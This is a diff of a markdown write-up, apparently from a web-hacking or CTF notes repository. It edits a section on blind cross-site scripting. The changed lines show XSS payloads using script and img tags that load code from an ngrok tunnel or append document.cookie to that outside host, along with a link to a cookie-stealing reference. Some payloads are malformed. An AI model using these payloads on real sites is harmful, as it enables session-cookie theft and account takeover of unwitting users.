@@ -29,10 +29,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <p align="center"><img src="_images/emailpdf.png"></p>
 <p align="center"><img src="_images/emailpdf.png"></p>
 
-payload:
-https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+payload:  
+[Reference here for BXSS payloads](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
 
-"><script src="https://56f5-59-102-23-9.au.ngrok.io"</script>  
+```
+"><script src="https://56f5-59-102-23-9.au.ngrok.io"</script>
+```
+
 "><script src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;alert(document.cookie);</script>  
 "><img src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;>  
 "<script>var i=new Image;i.src="https://56f5-59-102-23-9.au.ngrok.io"+document.cookie;</script>  
